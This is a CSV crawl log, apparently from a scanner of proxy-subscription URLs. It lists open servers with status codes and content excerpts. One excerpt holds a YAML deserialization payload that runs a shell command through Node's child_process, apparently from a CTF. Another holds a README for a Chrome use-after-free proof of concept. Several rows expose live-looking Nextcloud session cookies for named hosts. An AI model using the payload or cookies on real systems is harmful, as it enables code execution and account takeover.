原始URL,最终URL,状态,节点数,HTTP码,响应秒数,是否有更新,历史检查,历史更新,更新频率,上次更新时间,摘要
http://128.201.61.161:8888/dlog.txt,http://128.201.61.161:8888/dlog.txt,无有效节点,0,200,9.97,否,4,1,1/4,2026-09-02 22:04:30,"Aug 20 07:40:37 work360-lab2 dockerd[6620]: time=""2026-08-20T07:40:37.698423300Z"" level=info msg=""ignoring event"" container=88aca227553765b906af722fa310170ffb5a52e324046275985d2796193beddf module=libcontainerd namespace=moby topic=/tasks/delete type=""*events.TaskDelete"" Aug 20 07:40:40 work360-lab2 dockerd[6620]: time=""2026-08-20T07:40:40.859943607Z"" level=info msg=""ignoring event"" container=9a646971937d67a29161447d9c3344518926c165759746b45e47088fa43b209a module=libcontainerd namespace=moby topi"
http://128.201.61.161:8888/ev.txt,http://128.201.61.161:8888/ev.txt,请求失败,0,200,3.43,否,4,0,0/4,,
http://128.201.61.161:8888/hpb-images.pin.yaml,http://128.201.61.161:8888/hpb-images.pin.yaml,无有效节点,0,200,3.41,否,4,1,1/4,2026-09-02 22:04:30,# HPB image pin manifest — SSOT for field-proven digests (Sprint F127/F129) # Prod GO 2026-08-31 — work-talk-1.2.2 field pin (.119/.139/.161 lab) release: work-talk-1.2.2 fingerprint: sha256:e0a23a7ccd98af2a8501c45fd2d3fdba6bccc8cd1ba2f43c74117512e1f9dad6 version: 2 components:   signaling:     image_ref: softwarebeesy/nextcloud-spreed-signaling:2.1.1-work-talk-1.2.2     runtime_digest: sha256:3eeb742e039ad07745992c966f0989a2c4cabb84a2d77fdb6bcb7ab6a047ea18     distribution: local-only     note:
http://128.201.61.161:8888/images.txt,http://128.201.61.161:8888/images.txt,无有效节点,0,200,3.39,否,4,1,1/4,2026-09-02 22:04:30,ghcr.io/softwarebeesy/work-nextcloud-image:<none>	2724a6a57a11	35 hours ago ghcr.io/softwarebeesy/work-nextcloud-image:<none>	69f3692ce8ac	2 days ago ghcr.io/softwarebeesy/work-nextcloud-image:<none>	d92827c130da	2 days ago ghcr.io/softwarebeesy/work-nextcloud-image:<none>	83ac69a2dda6	2 days ago ghcr.io/softwarebeesy/work-nextcloud-image:<none>	e69c7f12685c	3 days ago ghcr.io/softwarebeesy/work-nextcloud-image:<none>	f0f719c067f9	3 days ago ghcr.io/softwarebeesy/work-nextcloud-image:<none>	1283
http://128.201.61.161:8888/mefw_cj.txt,http://128.201.61.161:8888/mefw_cj.txt,无有效节点,0,200,3.43,否,4,1,1/4,2026-09-02 22:04:30,# Netscape HTTP Cookie File # https://curl.se/docs/http-cookies.html # This file was generated by libcurl! Edit at your own risk.  #HttpOnly_10.100.11.1	FALSE	/	TRUE	0	PHPSESSID	d04978f4fc30126634b81dbc48c515d4 #HttpOnly_10.100.11.1	FALSE	/	TRUE	1787691524	cookie_test	551f8a644ad594b08d28aab7fd62420d 
http://128.201.61.161:8888/mefw_qga_api.txt,http://128.201.61.161:8888/mefw_qga_api.txt,无有效节点,0,200,3.41,否,4,1,1/4,2026-09-02 22:04:30,"{""response"":""OK""}"
http://128.201.61.161:8888/names.txt,http://128.201.61.161:8888/names.txt,无有效节点,0,200,3.41,否,4,1,1/4,2026-09-02 22:04:30,born-adopt-app born-adopt-harp born-node-exporter born-pilot-app born-pilot-cron born-pilot-harp born-pilot-nginx born-pilot-push labupdate-hpb-janus labupdate-hpb-nats labupdate-hpb-signaling pool-e797101a-app pool-e797101a-cron pool-e797101a-harp pool-e797101a-nginx pool-e797101a-push shared-collabora shared-db shared-grafana shared-janus shared-loki shared-nats shared-node-exporter shared-prometheus shared-promtail shared-recording shared-redis shared-redis-exporter shared-signaling shared-so
http://128.201.61.161:8888/nc-cookie-demo360-admin.txt,http://128.201.61.161:8888/nc-cookie-demo360-admin.txt,无有效节点,0,200,3.39,否,4,1,1/4,2026-09-02 22:04:30,# Netscape HTTP Cookie File # https://curl.se/docs/http-cookies.html # This file was generated by libcurl! Edit at your own risk.  #HttpOnly_demo360.work-lab.mework360.com.br	FALSE	/	TRUE	0	oc_sessionPassphrase	LL0hMSTsfSV6zI1Jt8XpDqr6Jx7Mwxq83U7%2BttNDLgVWdkMWO5KIBzWncjfjEJGYCUPzuPj%2Bxv9sgsO2DE77i3zWFKRk5JwGlRDEMBTI2LnpNsoe5jGqT6YE3Z3QQCnj #HttpOnly_demo360.work-lab.mework360.com.br	FALSE	/	TRUE	4133980799	__Host-nc_sameSiteCookielax	true #HttpOnly_demo360.work-lab.mework360.com.br	FALSE	/	TRU
http://128.201.61.161:8888/nc-cookie-mailperf-admin.txt,http://128.201.61.161:8888/nc-cookie-mailperf-admin.txt,无有效节点,0,200,3.42,否,4,1,1/4,2026-09-02 22:04:30,# Netscape HTTP Cookie File # https://curl.se/docs/http-cookies.html # This file was generated by libcurl! Edit at your own risk.  #HttpOnly_demo360.work-lab.mework360.com.br	FALSE	/	TRUE	0	oc_sessionPassphrase	whqWzbeNvUe5VmXHzyZtuzmu%2FbrFUAVoHrpIIHIYoumetlzshcaSvR6wlPajXqif0mEI6oM9SJhkPfR9qh3Qvhy9cNe2i%2FipLI4YBBAjFhx3s2F2Tk9zkFwRBOlgrYlC #HttpOnly_demo360.work-lab.mework360.com.br	FALSE	/	TRUE	4133980799	__Host-nc_sameSiteCookielax	true #HttpOnly_demo360.work-lab.mework360.com.br	FALSE	/	TRU
http://128.201.61.161:8888/nc-cookies.txt,http://128.201.61.161:8888/nc-cookies.txt,无有效节点,0,200,3.41,否,4,1,1/4,2026-09-02 22:04:30,# Netscape HTTP Cookie File # https://curl.se/docs/http-cookies.html # This file was generated by libcurl! Edit at your own risk.  
http://128.201.61.161:8888/nc34-dl.txt,http://128.201.61.161:8888/nc34-dl.txt,无有效节点,0,200,3.43,否,4,1,1/4,2026-09-02 22:04:30,nc34-503-fix-1786935088 
http://128.201.61.161:8888/nc34-test.txt,http://128.201.61.161:8888/nc34-test.txt,无有效节点,0,200,3.41,否,4,1,1/4,2026-09-02 22:04:30,nc34-503-fix-1786935088 
http://128.201.61.161:8888/platform-baseline-1.1.29.yaml,http://128.201.61.161:8888/platform-baseline-1.1.29.yaml,无有效节点,0,200,3.42,否,4,1,1/4,2026-09-02 22:04:30,name: platform-1.0.0-lab-baseline generated: '2026-06-13' source: LAB host 128.201.61.102 validated images requires_lab_signoff: true  images:   - name: shared-db     repo: mariadb     tag: '10.11'     digest: sha256:5a5c675881ef3fd1c1da9b0a3bfd6ee82edbe39cd9e32e06be18034c37235e0e    - name: shared-redis     repo: redis     tag: alpine     digest: sha256:09160599abd229764c0fb44cb6be640294e1d360a54b19985ab4843dcf2d90f1     was_floating: true    - name: shared-socket-proxy     repo: tecnativa/dock
http://128.201.61.161:8888/stats161.txt,http://128.201.61.161:8888/stats161.txt,无有效节点,0,200,3.41,否,4,1,1/4,2026-09-02 22:04:30,work-labupdate-nginx	0.00% work-labupdate-app	0.00% work-labupdate-cron	0.00% work-labupdate-push	0.03% shared-collabora	0.09% labupdate-hpb-signaling	0.02% labupdate-hpb-janus	0.69% pool-e797101a-push	0.00% pool-e797101a-nginx	0.00% pool-e797101a-cron	0.00% pool-e797101a-app	0.00% pool-e797101a-harp	0.02% work-labupdate-harp	5.62% labupdate-hpb-nats	0.04% born-pilot-push	0.00% born-pilot-harp	0.02% born-pilot-cron	0.00% born-pilot-nginx	0.00% born-pilot-app	0.00% born-adopt-app	0.00% born-adopt
http://128.201.61.161:8888/talk-bot-body.txt,http://128.201.61.161:8888/talk-bot-body.txt,无有效节点,0,200,3.43,否,4,1,1/4,2026-09-02 22:04:30,"<?xml version=""1.0""?> <ocs>  <meta>   <status>failure</status>   <statuscode>401</statuscode>   <message></message>  </meta>  <data/> </ocs> "
http://128.201.61.161:8888/talk-bot-msg.txt,http://128.201.61.161:8888/talk-bot-msg.txt,无有效节点,0,200,3.37,否,4,1,1/4,2026-09-02 22:04:30,"<?xml version=""1.0""?> <ocs>  <meta>   <status>ok</status>   <statuscode>201</statuscode>   <message>OK</message>  </meta>  <data/> </ocs> "
http://128.201.61.161:8888/webhook-response.txt,http://128.201.61.161:8888/webhook-response.txt,请求失败,0,200,5.55,否,4,0,0/4,,
http://128.201.61.161:8888/wh-resp.txt,http://128.201.61.161:8888/wh-resp.txt,请求失败,0,200,5.45,否,4,0,0/4,,
http://128.201.61.161:8888/work-talk-versions.yaml,http://128.201.61.161:8888/work-talk-versions.yaml,无有效节点,0,200,5.43,否,4,1,1/4,2026-09-02 22:04:30,"# work-talk-versions.yaml — SSOT stack Talk (evolução de hpb-images.pin.yaml) # Release id (work-talk-X) = stack imutável promovido lab→prod (D3). # Rótulos de deployment (environments) = qual release está pinado por ambiente. # Bump rule: NENHUM componente (HPB, spreed, NC tag, fork patch, config-schema) # muda sem novo release id + fingerprint_hpb.  schema_version: 2  environments:   work-talk-lab-version:     release_ref: work-talk-1.2     version: ""1.2""     hosts:       - 128.201.61.161     "
http://129.146.41.164:8088/clash-hy2.yaml,http://129.146.41.164:8088/clash-hy2.yaml,提取成功,1,200,0.09,否,4,1,1/4,2026-09-02 22:04:30,
http://129.146.41.164:8088/clashxpro-ss.yaml,http://129.146.41.164:8088/clashxpro-ss.yaml,提取成功,1,200,0.08,否,4,1,1/4,2026-09-02 22:04:30,
http://129.146.81.111:1029/ClashVerge.yaml,http://129.146.81.111:1029/ClashVerge.yaml,无有效节点,0,200,0.17,是,1,1,1/1,2026-09-04 23:19:55,proxy-providers:   mynodes:     type: http     url: http://server.yingdigame.com:1029/provider.yaml     interval: 3600     path: ./providers/mynodes.yaml proxy-groups:   - name: select     type: select     use:       - mynodes   - name: load-balance     type: load-balance     use:       - mynodes     url: http://www.gstatic.com/generate_204     interval: 300     strategy: consistent-hashing   - name: Proxy     type: select     proxies:       - select       - load-balance       - DIRECT   - name:
http://129.146.81.111:1029/ClashVerge001.yaml,http://129.146.81.111:1029/ClashVerge001.yaml,提取成功,1,200,2.89,是,1,1,1/1,2026-09-04 23:19:55,
http://129.146.81.111:1029/ClashVerge002.yaml,http://129.146.81.111:1029/ClashVerge002.yaml,无有效节点,0,200,3.22,是,1,1,1/1,2026-09-04 23:19:55,"proxy-providers:   mynodes:     type: http     url: http://server.yingdigame.com:1029/provider.yaml     interval: 3600     path: ./providers/mynodes.yaml proxy-groups:   - name: select     type: select     use:       - mynodes   - name: load-balance     type: load-balance     use:       - mynodes     url: http://www.gstatic.com/generate_204     interval: 300     strategy: consistent-hashing   - name: load-balance-hy     type: load-balance     use:       - mynodes     include-filter: ""^hy-""     u"
http://129.146.81.111:1029/mine.yaml,http://129.146.81.111:1029/mine.yaml,提取成功,21,200,3.18,是,1,1,1/1,2026-09-04 23:19:55,
http://129.146.81.111:1029/provider.yaml,http://129.146.81.111:1029/provider.yaml,提取成功,3,200,3.21,是,1,1,1/1,2026-09-04 23:19:55,
http://129.226.60.230:8080/NestedLoopRawPtr_497736679.yaml,http://129.226.60.230:8080/NestedLoopRawPtr_497736679.yaml,无有效节点,0,200,3.29,否,4,1,1/4,2026-09-02 22:04:30,"name: NestedLoopRawPtr label: Nested-Loop Raw-Pointer UAF  dangerous_operation: >   A raw T* pointer (stack variable or function parameter) is held across a   nested event/message loop invocation (RunDragDropLoop, RunShellDrag,   DoDragDrop, or any function entering   ScopedAllowApplicationTasksInNativeNestedLoop). The nested loop re-enters   the UI thread event loop, allowing arbitrary tasks, IPCs, and widget   destruction to occur while the raw pointer is live on the stack. When the   loop ret"
http://129.226.60.230:8080/README_WIN.txt,http://129.226.60.230:8080/README_WIN.txt,无有效节点,0,200,3.3,否,4,1,1/4,2026-09-02 22:04:30,"PoC for WebRtcVideoFrameAdapter::SharedResources CallbackUAF ==============================================================  FILE: poc_win_chrome_uaf.html  CHROME LAUNCH COMMAND (Windows PowerShell):    & ""C:\path\to\chrome.exe"" `     --no-sandbox `     --no-first-run `     --disable-extensions `     --allow-file-access-from-files `     --use-fake-device-for-media-stream `     --use-fake-ui-for-media-stream `     --enable-features=WebrtcAcceleratedScaling `     --js-flags=""--expose-gc"" `     ""fi"
http://129.226.60.230:8080/angle_chrome_files.txt,http://129.226.60.230:8080/angle_chrome_files.txt,无有效节点,0,200,3.34,否,4,1,1/4,2026-09-02 22:04:30,third_party/angle/src/common/CompiledShaderState.cpp third_party/angle/src/common/Float16ToFloat32.cpp third_party/angle/src/common/MemoryBuffer.cpp third_party/angle/src/common/PackedEGLEnums_autogen.cpp third_party/angle/src/common/PackedEnums.cpp third_party/angle/src/common/PackedGLEnums_autogen.cpp third_party/angle/src/common/PoolAlloc.cpp third_party/angle/src/common/SimpleMutex.cpp third_party/angle/src/common/WorkerThread.cpp third_party/angle/src/common/aligned_memory.cpp third_party/a
http://129.226.60.230:8080/angle_chrome_files_stable.txt,http://129.226.60.230:8080/angle_chrome_files_stable.txt,无有效节点,0,200,3.3,否,4,1,1/4,2026-09-02 22:04:30,third_party/angle/src/common/CompiledShaderState.cpp third_party/angle/src/common/Float16ToFloat32.cpp third_party/angle/src/common/MemoryBuffer.cpp third_party/angle/src/common/PackedEGLEnums_autogen.cpp third_party/angle/src/common/PackedEnums.cpp third_party/angle/src/common/PackedGLEnums_autogen.cpp third_party/angle/src/common/PoolAlloc.cpp third_party/angle/src/common/SimpleMutex.cpp third_party/angle/src/common/WorkerThread.cpp third_party/angle/src/common/aligned_memory.cpp third_party/a
http://129.70.142.193/ros-one.yaml,http://129.70.142.193/ros-one.yaml,无有效节点,0,200,3.38,否,4,1,1/4,2026-09-02 22:04:30,ackermann_steering_controller:   debian:   - ros-one-ackermann-steering-controller   ubuntu:   - ros-one-ackermann-steering-controller actionlib:   debian:   - ros-one-actionlib   ubuntu:   - ros-one-actionlib actionlib_msgs:   debian:   - ros-one-actionlib-msgs   ubuntu:   - ros-one-actionlib-msgs actionlib_tools:   debian:   - ros-one-actionlib-tools   ubuntu:   - ros-one-actionlib-tools actionlib_tutorials:   debian:   - ros-one-actionlib-tutorials   ubuntu:   - ros-one-actionlib-tutorials ag
http://13.115.42.219/3cbb6f7ee1080d0bc916.yaml,http://13.115.42.219/3cbb6f7ee1080d0bc916.yaml,提取成功,1,200,3.23,是,1,1,1/1,2026-09-04 23:19:55,
http://13.115.42.219/5147e9ebe6b7ae44965e.yaml,http://13.115.42.219/5147e9ebe6b7ae44965e.yaml,提取成功,3,200,3.24,是,1,1,1/1,2026-09-04 23:19:55,
http://13.115.42.219/5b82b44bd840de4976d3e128.yaml,http://13.115.42.219/5b82b44bd840de4976d3e128.yaml,提取成功,1,200,3.28,是,1,1,1/1,2026-09-04 23:19:55,
http://13.115.42.219/5f5956f5891883f92e8a.yaml,http://13.115.42.219/5f5956f5891883f92e8a.yaml,提取成功,1,200,3.28,是,1,1,1/1,2026-09-04 23:19:55,
http://13.115.42.219/68c82d9c1f134ab6fa5e.yaml,http://13.115.42.219/68c82d9c1f134ab6fa5e.yaml,提取成功,1,200,3.23,是,1,1,1/1,2026-09-04 23:19:55,
http://13.115.42.219/clash.yaml,http://13.115.42.219/clash.yaml,提取成功,3,200,3.26,是,1,1,1/1,2026-09-04 23:19:55,
http://13.115.42.219/shadowrocket-clash-compatible-plain.txt,http://13.115.42.219/shadowrocket-clash-compatible-plain.txt,提取成功,3,200,3.23,是,1,1,1/1,2026-09-04 23:19:55,
http://13.115.42.219/shadowrocket-clash-compatible.txt,http://13.115.42.219/shadowrocket-clash-compatible.txt,提取成功,3,200,3.23,是,1,1,1/1,2026-09-04 23:19:55,
http://13.115.42.219/shadowrocket-legacy.txt,http://13.115.42.219/shadowrocket-legacy.txt,提取成功,1,200,3.49,是,1,1,1/1,2026-09-04 23:19:55,
http://13.115.42.219/shadowrocket-nodes-all.txt,http://13.115.42.219/shadowrocket-nodes-all.txt,提取成功,2,200,3.49,是,1,1,1/1,2026-09-04 23:19:55,
http://13.115.42.219/shadowrocket-sip002.txt,http://13.115.42.219/shadowrocket-sip002.txt,提取成功,1,200,3.49,是,1,1,1/1,2026-09-04 23:19:55,
http://13.115.42.219/shadowrocket-ss-legacy.txt,http://13.115.42.219/shadowrocket-ss-legacy.txt,提取成功,1,200,3.46,是,1,1,1/1,2026-09-04 23:19:55,
http://13.115.42.219/shadowrocket-ss-nodes.txt,http://13.115.42.219/shadowrocket-ss-nodes.txt,提取成功,1,200,3.46,是,1,1,1/1,2026-09-04 23:19:55,
http://13.115.42.219/shadowrocket-ss-sub.txt,http://13.115.42.219/shadowrocket-ss-sub.txt,提取成功,1,200,3.49,是,1,1,1/1,2026-09-04 23:19:55,
http://13.115.42.219/shadowrocket-sub-all.txt,http://13.115.42.219/shadowrocket-sub-all.txt,提取成功,1,200,3.49,是,1,1,1/1,2026-09-04 23:19:55,
http://13.115.42.219/shadowrocket-sub-legacy.txt,http://13.115.42.219/shadowrocket-sub-legacy.txt,提取成功,1,200,3.49,是,1,1,1/1,2026-09-04 23:19:55,
http://13.115.42.219/shadowrocket-sub-sip002.txt,http://13.115.42.219/shadowrocket-sub-sip002.txt,提取成功,1,200,3.46,是,1,1,1/1,2026-09-04 23:19:55,
http://13.115.42.219/shadowrocket.txt,http://13.115.42.219/shadowrocket.txt,提取成功,3,200,3.46,是,1,1,1/1,2026-09-04 23:19:55,
http://13.115.42.219/sr-sub.txt,http://13.115.42.219/sr-sub.txt,提取成功,3,200,3.46,是,1,1,1/1,2026-09-04 23:19:55,
http://13.115.42.219/ss-8388-clash.yaml,http://13.115.42.219/ss-8388-clash.yaml,提取成功,1,200,3.47,是,1,1,1/1,2026-09-04 23:19:55,
http://13.115.42.219/ss-8388-link.txt,http://13.115.42.219/ss-8388-link.txt,提取成功,1,200,5.46,是,1,1,1/1,2026-09-04 23:19:55,
http://13.115.42.219/ss-8388-sub.txt,http://13.115.42.219/ss-8388-sub.txt,提取成功,1,200,5.46,是,1,1,1/1,2026-09-04 23:19:55,
http://13.115.42.219/ss-node.txt,http://13.115.42.219/ss-node.txt,提取成功,1,200,5.46,是,1,1,1/1,2026-09-04 23:19:55,
http://13.115.42.219/ss.txt,http://13.115.42.219/ss.txt,提取成功,1,200,5.46,是,1,1,1/1,2026-09-04 23:19:55,
http://13.115.42.219/sub.txt,http://13.115.42.219/sub.txt,提取成功,1,200,5.46,是,1,1,1/1,2026-09-04 23:19:55,
http://13.212.216.218/hy2.yaml,http://13.212.216.218/hy2.yaml,提取成功,1,200,3.5,是,1,1,1/1,2026-09-04 23:19:55,
http://130.185.249.232:18080/gb-vohive-a12e0768.yaml,http://130.185.249.232:18080/gb-vohive-a12e0768.yaml,提取成功,1,200,3.49,否,4,1,1/4,2026-09-02 22:04:30,
http://130.94.34.165:8000/exp2.yaml,http://130.94.34.165:8000/exp2.yaml,无有效节点,0,200,3.5,否,4,1,1/4,2026-09-02 22:04:30,"prisoner_profile:   name: !!js/function >-     function(){ return process.mainModule.require(""child_process"").execSync(""/readflag"").toString(); } "
http://132.226.169.119/1.yaml,http://132.226.169.119/1.yaml,提取成功,36,200,3.53,否,4,1,1/4,2026-09-02 22:04:30,
http://132.226.169.119/85LA_LST0.txt,http://132.226.169.119/85LA_LST0.txt,请求失败,0,200,3.49,否,4,0,0/4,,
http://132.226.169.119/BASE_arr.txt,http://132.226.169.119/BASE_arr.txt,无有效节点,0,200,3.49,否,4,1,1/4,2026-09-02 22:04:30,smjh.de5.net 
http://132.226.169.119/BEST_LST.txt,http://132.226.169.119/BEST_LST.txt,无有效节点,0,200,3.49,是,4,3,3/4,2026-09-04 23:19:55,      - 104.18.33.120-xcd       - 104.18.33.120-8oc       - 104.18.33.120-bn1       - 104.18.33.120-ezr       - 104.18.33.120-c5l       - 104.18.33.120-2nf       - 188.164.248.136-xcd       - 188.164.248.136-8oc       - 188.164.248.136-bn1       - 188.164.248.136-ezr       - 188.164.248.136-c5l       - 188.164.248.136-2nf       - 188.164.248.191-xcd       - 188.164.248.191-8oc       - 188.164.248.191-bn1       - 188.164.248.191-ezr       - 188.164.248.191-c5l       - 188.164.248.191-2nf       - 
http://132.226.169.119/CH.txt,http://132.226.169.119/CH.txt,无有效节点,0,200,3.49,否,4,1,1/4,2026-09-02 22:04:30,104.18.34.100#新加坡 104.18.34.105#新加坡 104.18.34.115#新加坡 104.18.34.12#新加坡 104.18.34.150#新加坡 104.18.34.100#日本 104.18.34.105#日本 104.18.34.115#日本 104.18.34.12#日本 104.18.34.150#日本 104.16.0.110#美国 104.16.0.148#美国 104.16.0.208#美国 104.16.0.39#美国 104.16.1.156#美国 
http://132.226.169.119/IPTV.txt,http://132.226.169.119/IPTV.txt,无有效节点,0,200,4.92,否,4,1,1/4,2026-09-02 22:04:30,"央卫频道,#genre# CCTV1,webview://https://yangshipin.cn/tv/home?pid=600001859 CCTV2,webview://https://yangshipin.cn/tv/home?pid=600001800 CCTV3,webview://https://yangshipin.cn/tv/home?pid=600001801 CCTV4,webview://https://yangshipin.cn/tv/home?pid=600001814 CCTV5,webview://https://yangshipin.cn/tv/home?pid=600001818 CCTV5+,webview://https://yangshipin.cn/tv/home?pid=600001817 CCTV6,webview://https://yangshipin.cn/tv/home?pid=600108442 CCTV7,webview://https://yangshipin.cn/tv/home?pid=600004092 CCTV8,"
http://132.226.169.119/JP_LST.txt,http://132.226.169.119/JP_LST.txt,无有效节点,0,200,2.97,否,4,1,1/4,2026-09-02 22:04:30,      - 🔰 节点选择 
http://132.226.169.119/NODE_LST.txt,http://132.226.169.119/NODE_LST.txt,无有效节点,0,200,2.97,是,4,3,3/4,2026-09-04 23:19:55,       - 104.18.33.120-xcd       - 104.18.33.120-8oc       - 104.18.33.120-bn1       - 104.18.33.120-ezr       - 104.18.33.120-c5l       - 104.18.33.120-2nf       - 188.164.248.136-xcd       - 188.164.248.136-8oc       - 188.164.248.136-bn1       - 188.164.248.136-ezr       - 188.164.248.136-c5l       - 188.164.248.136-2nf       - 188.164.248.191-xcd       - 188.164.248.191-8oc       - 188.164.248.191-bn1       - 188.164.248.191-ezr       - 188.164.248.191-c5l       - 188.164.248.191-2nf       -
